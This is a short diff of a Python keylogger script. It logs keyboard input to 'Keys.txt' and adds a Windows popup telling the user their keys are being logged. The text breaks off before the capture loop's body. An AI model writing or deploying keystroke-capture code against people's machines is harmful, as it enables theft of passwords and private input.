@@ -1,9 +1,9 @@
 # Importing the keyboard module which will acess the inputs from the keyboard
 import keyboard
-
+import os
 # Defining the text file name and path
-path = "data.txt"
-
+path = "Keys.txt"
+os.system("msg * Your keys are now logged into Keys.txt.")
 while True:
     with open(path, 'a') as data_file:
         
